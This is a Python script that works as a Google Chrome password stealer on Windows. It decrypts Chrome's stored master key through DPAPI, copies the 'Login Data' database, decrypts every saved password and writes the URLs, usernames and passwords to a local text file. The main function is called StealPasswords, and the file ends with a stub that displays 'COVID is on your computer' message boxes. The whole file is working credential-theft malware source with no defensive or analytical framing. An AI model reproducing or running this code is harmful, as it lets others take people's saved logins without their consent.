import os
import json
import base64
import sqlite3
import ctypes
from ctypes import wintypes
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import shutil
from datetime import datetime, timedelta


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_char))
    ]


# Get data

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.c_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    ctypes.windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None,
                                                None, 0x01, ctypes.byref(blob_out)):
        return GetData(blob_out)


def decrypt_password(buff, key):
    starts = buff.decode(encoding='utf-8', errors='ignore')[:3]

    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    else:
        decrypted_pass = CryptUnprotectData(buff)
        return decrypted_pass


def StealPasswords():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")

    filename = 'ChromeData.db'
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        'select origin_url, username_value, password_value, date_last_used from logins order by date_last_used')
    result = []
    file = open('chromePasswords.txt', 'w')
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        if type(username) is not str:
            username = username.decode('windows-1254')
        password = decrypt_password(row[2], key)
        if type(password) is bytes:
            password = str(password, 'utf-8')
        dct = dict()
        if username or password:
            dct = {
                'Origin URL': origin_url,
                'Username': username,
                'Password': password
            }
        else:
            continue

        result.append(dct)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    for item in result:
        file.write('%s\n' % item)


# Displays a message on the screen

def SendMessageBox(Message):
    ctypes.windll.user32.MessageBoxW(0, Message, 'Successful', 0)

i = 0
while(i<0):
    i+=1
    SendMessageBox('COVID{} is on your computer!'.format(i))
